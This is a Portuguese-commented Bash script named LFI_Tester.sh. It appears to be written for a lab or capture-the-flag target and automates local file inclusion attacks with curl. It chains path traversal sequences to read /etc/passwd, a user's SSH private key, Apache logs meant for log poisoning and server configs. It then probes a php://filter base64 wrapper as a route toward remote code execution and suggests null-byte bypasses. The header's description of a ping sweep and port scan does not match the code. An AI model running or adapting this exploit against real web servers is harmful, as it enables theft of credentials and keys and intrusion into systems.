#!/bin/bash

# ==============================================================================
# Título:       LFI_Tester.sh
# Descrição:    Realiza um reconhecimento inicial (ping sweep e port scan) no alvo.
# Autor:        Alexandre Vieira de Souza
# Data:         2025-12-15
# Versão:       1.0
# Uso:          
# Notas:        
# ==============================================================================
# LICENÇA (GPLv2):
#
# Este programa é software livre; você pode redistribuí-lo e/ou modificá-lo
# sob os termos da Licença Pública Geral GNU conforme publicada pela
# Free Software Foundation; tanto a versão 2 da Licença, como (a seu critério)
# qualquer versão posterior.
#
# Este programa é distribuído na expectativa de que seja útil,
# porém, SEM NENHUMA GARANTIA; nem mesmo a garantia implícita de
# COMERCIABILIDADE ou ADEQUAÇÃO A UMA FINALIDADE ESPECÍFICA.
# Consulte a Licença Pública Geral do GNU para mais detalhes.
# ==============================================================================

set -euo pipefail

# --- Código começa aqui ---

# ===============================================
# Configuração
# ===============================================

# URL da aplicação vulnerável (parâmetro 'file=' já incluído)
# Exemplo: http://10.10.1.129/?file=
TARGET_URL="http://10.10.1.129/?file="

# Sequência de Path Traversal (usamos 6 vezes "../" para garantir a saída de subdiretórios)
# Isso permite sair da 'Root folder' da aplicação [1], [2]
TRAVERSAL="../../..///../../" 

# Array de Arquivos a Testar
# O /etc/passwd é o arquivo padrão para testar LFI [1], [3], [4]
# Incluímos tentativas de chaves SSH (usando 'ghost' como exemplo de usuário dos sistemas fonte) e logs.
COMMON_FILES=(
    "etc/passwd"
    "etc/hosts"
    "etc/resolv.conf"
    "home/junior/.ssh/id_rsa" # Tentativa de leitura da chave SSH de um usuário [5]
    "var/log/apache2/access.log" # Tentativa de acesso a logs para possível Log Poisoning [6]
    "etc/httpd/conf/httpd.conf" # Arquivos de configuração [1]
)

# ===============================================
# Funções
# ===============================================

# Função para realizar o teste de Path Traversal
testar_path_traversal() {
    local arquivo="$1"
    local payload="${TRAVERSAL}${arquivo}"
    local url_completa="${TARGET_URL}${payload}"

    echo "[+] Tentando ler: /${arquivo}"
    echo "  -> URL: ${url_completa}"
    
    # Executa a requisição usando curl e mostra as primeiras 10 linhas da resposta
    response=$(curl -s "$url_completa")
    
    if [[ -z "$response" ]]; then
        echo "  [INFO] Resposta vazia ou acesso negado."
    else
        echo "  [SUCESSO] Conteúdo encontrado (Primeiras 5 linhas):"
        echo "--- INÍCIO ---"
        echo "$response" | head -n 5 
        echo "--- FIM ---"
    fi
}

# Função para testar a funcionalidade de Wrappers PHP (para possível RCE)
testar_wrapper() {
    echo ""
    echo "=========================================================="
    echo "  [TESTE AVANÇADO] Verificando funcionalidade de Wrappers"
    echo "=========================================================="
    
    # Tentativa de ler um arquivo conhecido (notes.txt, o arquivo inicial) codificado em Base64
    # Isso verifica se o servidor processa wrappers, indicando que a injeção de comandos é possível [7]
    WRAPPER_PAYLOAD="php://filter/convert.base64-encode/resource=notes.txt"
    url_completa="${TARGET_URL}${WRAPPER_PAYLOAD}"

    echo "[+] Tentando ler 'notes.txt' via Base64 filter:"
    echo "  -> URL: ${url_completa}"
    
    response=$(curl -s "$url_completa")
    
    # Verifica se a resposta contém a tag PHP de Base64
    if [[ "$response" == *base64* ]]; then
        echo "  [SUCESSO CRÍTICO] O servidor processa Wrappers PHP. RCE/Reverse Shell possível [7]."
        echo "  [DICA] Conteúdo de 'notes.txt' em Base64:"
        echo "$response" | grep -oP 'base64,([a-zA-Z0-9+/=]+)' | sed 's/base64,//' | base64 -d 
    else
        echo "  [INFO] Wrappers PHP não responderam conforme esperado."
    fi
}

# ===============================================
# Execução
# ===============================================

echo "Iniciando teste de LFI na URL base: ${TARGET_URL}"
echo "----------------------------------------------------------"

# 1. Teste de Path Traversal
for arquivo in "${COMMON_FILES[@]}"; do
    testar_path_traversal "$arquivo"
done

# 2. Teste de Wrapper PHP
testar_wrapper

echo "----------------------------------------------------------"
echo "Automação de bypass (como %00 ou alternância de pontos) deve ser tentada manualmente se os testes acima falhar
